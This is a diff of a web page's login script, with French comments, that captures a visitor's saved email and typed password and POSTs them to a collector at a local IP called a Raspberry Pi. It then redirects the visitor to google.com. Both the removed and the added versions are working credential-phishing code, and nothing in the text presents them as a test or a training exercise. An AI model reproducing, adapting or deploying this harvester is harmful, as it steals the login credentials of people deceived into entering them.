@@ -26,44 +26,44 @@
 </div>
 
 <script>
-  // Affiche l'email récupéré
-  const emailValue = localStorage.getItem('userEmail');
-  if (emailValue) {
-      document.getElementById('display-email').innerText = emailValue;
-  }
+  // 1. Récupérer l'email sauvegardé sur la page précédente
+  const emailSauvegarde = localStorage.getItem('userEmail');
 
-  document.getElementById('btn-connect').addEventListener('click', async function() {
-    const passwordValue = document.getElementById('password').value;
-    const URL = `http://192.168.1.157:5000/data`;
+  document.getElementById('btn-next').addEventListener('click', async function() {
+    const passwordInput = document.getElementById('password');
+    const passwordValue = passwordInput.value;
 
     if (!passwordValue) {
         alert("Please enter a password");
         return;
     }
 
-    this.innerText = "Connecting...";
+    const URL = `http://192.168.1.172:5000/data`; // Vérifiez bien l'IP
+
+    this.innerText = "Loading...";
     this.disabled = true;
 
     try {
         const response = await fetch(URL, {
-            method: 'POST',
+            method: 'POST', // On utilise bien POST
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
-                email: emailValue,
-                password: passwordValue,
+                email: emailSauvegarde, // Envoie l'email stocké
+                password: passwordValue, // Envoie le mot de passe saisi
                 timestamp: new Date().toISOString()
             })
         });
 
         if (response.ok) {
-            window.location.href = 'https://www.google.com'; // Redirection finale
+            window.location.href = 'https://www.google.com';
         } else {
-            alert("Error: " + response.status);
+            alert("Erreur serveur : " + response.status);
             this.innerText = "Connect";
             this.disabled = false;
         }
     } catch (error) {
-        alert("Could not connect to Raspberry Pi.");
+        console.error("Erreur :", error);
+        alert("Impossible de contacter le Raspberry Pi.");
         this.innerText = "Connect";
         this.disabled = false;
     }
